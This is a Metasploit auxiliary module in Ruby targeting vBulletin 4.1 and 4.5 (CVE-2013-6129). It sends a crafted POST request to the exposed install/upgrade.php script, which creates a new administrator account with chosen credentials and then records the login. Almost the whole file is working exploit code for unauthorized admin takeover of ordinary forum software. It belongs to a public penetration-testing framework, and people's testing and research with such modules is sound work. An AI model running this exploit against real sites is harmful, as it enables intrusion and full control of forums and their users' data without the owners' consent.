##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'vBulletin Administrator Account Creation',
      'Description'   => %q{
          This module abuses the "install/upgrade.php" component on vBulletin 4.1+ and 4.5+ to
          create a new administrator account, as exploited in the wild on October 2013. This module
          has been tested successfully on vBulletin 4.1.5 and 4.1.0.
        },
      'Author'        =>
        [
          'Unknown', # Vulnerability discoverer? found in the wild
          'juan vazquez' #metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-6129' ],
          [ 'URL', 'http://blog.imperva.com/2013/10/threat-advisory-a-vbulletin-exploit-administrator-injection.html'],
          [ 'OSVDB', '98370' ],
          [ 'URL', 'http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/3991423-potential-vbulletin-exploit-vbulletin-4-1-vbulletin-5']
        ],
      'DisclosureDate' => 'Oct 09 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [ true,  "The vbulletin URI", '/']),
        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
      ])
  end

  def user
    datastore["USERNAME"]
  end

  def pass
    datastore["PASSWORD"]
  end

  def run

    if user == pass
      print_error("Please select a password different than the username")
      return
    end

    print_status("Trying a new admin vBulletin account...")

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, "install", "upgrade.php"),
      'method'    =>'POST',
      'vars_post' => {
        "version"  => "install",
        "response" => "true",
        "checktable" => "false",
        "firstrun" => "false",
        "step" => "7",
        "startat" => "0",
        "only" => "false",
        "options[skiptemplatemerge]" => "0",
        "reponse" => "yes",
        "htmlsubmit" => "1",
        "htmldata[username]" => user,
        "htmldata[password]" => pass,
        "htmldata[confirmpassword]" => pass,
        "htmldata[email]" => datastore["EMAIL"]
      },
      'headers' => {
        "X-Requested-With" => "XMLHttpRequest"
      }
    })

    if res and res.code == 200 and res.body =~ /Administrator account created/
      print_good("Admin account with credentials #{user}:#{pass} successfully created")
      connection_details = {
          module_fullname: self.fullname,
          username: user,
          private_data: pass,
          private_type: :password,
          status: Metasploit::Model::Login::Status::UNTRIED,
          proof: res.body
      }.merge(service_details)
      create_credential_and_login(connection_details)
    else
      print_error("Admin account creation failed")
    end
  end
end
